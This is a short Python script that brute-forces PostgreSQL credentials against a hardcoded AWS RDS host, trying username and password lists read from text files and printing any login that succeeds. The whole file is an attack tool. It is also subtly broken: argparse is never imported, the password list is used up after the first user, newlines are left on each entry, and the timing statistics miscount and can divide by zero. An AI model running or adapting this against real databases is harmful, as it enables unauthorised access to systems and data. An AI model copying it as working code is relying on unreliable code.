import psycopg2
import time

host='postgre-db-test.c8ur2wv0ivpl.us-east-1.rds.amazonaws.com'
users_file='users.txt'
passwords_file='passwords.txt'

def bruteforce(user):
    user_list= [user] if user else open(f'{users_file}',"r")
    password_list= open(f'{passwords_file}',"r")

    start = time.time()

    iterations=0
    for current_user in user_list:
        print(f'Testing user: {current_user}')
        for current_password in password_list:
            # print(f'Testing password: {current_password}')
            try:
                engine = psycopg2.connect(
                    database="postgres",
                    user=current_user,
                    password=current_password,
                    host=host,
                    port='5432'
                )
            except Exception as e:
                continue
            iterations+=1
            
            print(f'Found: {current_password}')

    elapsed = (time.time() - start)
    print(f'\nTotal bruteforcing time: {elapsed} for {iterations} trials')
    print(f'\nMean bruteforcing time: {elapsed/iterations}')

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Bruteforcer')
    parser.add_argument('-u','--user',
                        help="Fixed user to test",
                        default=None
                        )
    options= parser.parse_args()       

    bruteforce(options.user)